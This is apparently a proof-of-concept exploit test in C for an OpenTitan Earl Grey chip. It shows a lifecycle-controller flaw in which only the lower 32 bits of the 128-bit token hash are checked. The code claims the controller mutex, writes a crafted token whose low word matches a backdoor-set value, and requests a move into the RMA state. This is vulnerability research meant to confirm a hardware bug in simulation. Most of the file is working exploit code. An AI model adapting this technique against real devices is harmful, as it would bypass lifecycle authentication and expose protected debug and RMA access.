/*
 * Proof-of-Concept test for LC_CTRL hash truncation vulnerability (Vuln ID 3)
 *
 * This test demonstrates that the LC controller FSM only compares the lower
 * 32 bits of the 128-bit token hash (hashed_token_i[31:0] ==
 * hashed_token_mux[31:0]) before allowing a transition to FlashRmaSt (RMA).
 * The RTL lines responsible are:
 *   if (hashed_token_i[31:0] == hashed_token_mux[31:0] &&
 *       !token_hash_err_i &&
 *       &hashed_token_valid_mux) begin
 *     fsm_state_d = FlashRmaSt;
 *
 * To make this demonstrable in simulation, the test assumes that the
 * simulation testbench has backdoor-set the expected (hashed_token_mux)
 * lower 32-bit value to a known constant (see README). The test writes a
 * transition token whose lower 32-bit word matches that constant and then
 * requests a transition to the RMA state. If the hardware indeed performs
 * only the 32-bit compare, the transition will succeed.
 */

#include <stdbool.h>
#include <stdint.h>

#include "sw/device/lib/testing/test_framework/ottf_main.h"
#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/testing/test_framework/check.h"

#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/bitfield.h"
#include "sw/device/lib/base/multibits.h"

#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"
#include "lc_ctrl_regs.h"  // Generated register offset & field definitions

OTTF_DEFINE_TEST_CONFIG();

// A helper to write the 128-bit token (4 x 32-bit words) into the HW token
// registers. The layout follows the autogen registers: TOKEN_0..TOKEN_3.
static void lc_write_token(mmio_region_t lc_reg, const uint32_t token_words[4]) {
  for (int i = 0; i < 4; ++i) {
    mmio_region_write32(lc_reg, LC_CTRL_TRANSITION_TOKEN_0_REG_OFFSET + (i * 4),
                        token_words[i]);
  }
}

// Read the lifecycle state CSR and return the enumerated value from the
// autogen header.
static uint32_t lc_read_state(mmio_region_t lc_reg) {
  return mmio_region_read32(lc_reg, LC_CTRL_LC_STATE_REG_OFFSET);
}

bool test_main(void) {
  LOG_INFO("LC_CTRL hash truncation vulnerability PoC (Vuln ID 3)");

  // Acquire an mmio_region for the LC_CTRL device registers.
  mmio_region_t lc_reg = mmio_region_from_addr(TOP_EARLGREY_LC_CTRL_REGS_BASE_ADDR);

  // NOTE: For this PoC we avoid DIFs and use base mmio APIs directly as
  // required by the exploit development policy.

  // Assumptions (must be prepared by the simulation testbench):
  //  - hashed_token_mux lower 32-bit value has been set (via backdoor) to
  //    the constant EXPECTED_HASH_LOW32 below.
  //  - token_hash_err_i is false and hashed_token_valid_mux is asserted.
  // The testbench can set these with SV backdoors; see README.

  const uint32_t EXPECTED_HASH_LOW32 = 0xDEADBEEFu;  // MATCH WITH SIM TB

  LOG_INFO("Preparing token whose low 32-bit word = 0x%08x",
           EXPECTED_HASH_LOW32);

  // Prepare a token with arbitrary high words and the low word equal to the
  // expected hash lower 32 bits. In a correct implementation a full 128-bit
  // comparison is required; due to the bug only this low word is checked.
  const uint32_t exploit_token[4] = {0x00000000u, 0x11111111u, 0x22222222u,
                                     EXPECTED_HASH_LOW32};

  // Claim the LC_CTRL mutex via the claim register so software may program
  // the transition and token. We follow the same sequencing as the DIF but
  // use base mmio operations.
  mmio_region_write32(lc_reg, LC_CTRL_CLAIM_TRANSITION_IF_REG_OFFSET,
                      kMultiBitBool8True);

  // Wait briefly by polling the claim register to ensure we've taken the
  // mutex. In simulation this should be instantaneous.
  uint32_t claim_val = mmio_region_read32(lc_reg, LC_CTRL_CLAIM_TRANSITION_IF_REG_OFFSET);
  CHECK(claim_val == kMultiBitBool8True, "Failed to claim LC mutex");
  LOG_INFO("Claimed LC_CTRL mutex");

  // Program the transition target to RMA. Use autogen constant.
  mmio_region_write32(lc_reg, LC_CTRL_TRANSITION_TARGET_REG_OFFSET,
                      LC_CTRL_TRANSITION_TARGET_STATE_VALUE_RMA);

  // Program transition control: internal clock (clear ext clock bit).
  uint32_t ctrl_reg = 0;
  ctrl_reg = bitfield_bit32_write(ctrl_reg, LC_CTRL_TRANSITION_CTRL_EXT_CLOCK_EN_BIT, false);
  mmio_region_write32(lc_reg, LC_CTRL_TRANSITION_CTRL_REG_OFFSET, ctrl_reg);

  // Fill token registers with exploit token. We write the 128-bit token
  // directly to the token registers.
  lc_write_token(lc_reg, exploit_token);
  LOG_INFO("Exploit token written (low word = 0x%08x)", EXPECTED_HASH_LOW32);

  // Trigger the transition command.
  mmio_region_write32(lc_reg, LC_CTRL_TRANSITION_CMD_REG_OFFSET, 1u);
  LOG_INFO("Transition command issued");

  // In simulation the DUT might reset/reboot after a successful transition.
  // We'll poll the LC_STATE register to see if we entered RMA (or FlashRmaSt
  // alias from RTL). The autogen defines a STATE field; here we just read
  // the register and compare against the expected value for RMA.

  // Poll a few times for state change.
  bool success = false;
  for (int i = 0; i < 1000; ++i) {
    uint32_t state_reg = lc_read_state(lc_reg);
    uint32_t state_field = bitfield_field32_read(state_reg, LC_CTRL_LC_STATE_STATE_FIELD);
    if (state_field == LC_CTRL_LC_STATE_STATE_VALUE_RMA) {
      success = true;
      break;
    }
  }

  // Release the mutex if still held (best-effort).
  mmio_region_write32(lc_reg, LC_CTRL_CLAIM_TRANSITION_IF_REG_OFFSET,
                      kMultiBitBool8False);

  if (success) {
    LOG_INFO("Transition to RMA state observed -> vulnerability confirmed");
    return true;
  } else {
    LOG_INFO("No RMA transition observed. Ensure simulation backdoor sets\n"
             "hashed_token_mux low32 to 0x%08x and asserts hashed_token_valid_mux",
             EXPECTED_HASH_LOW32);
    return false;
  }
}
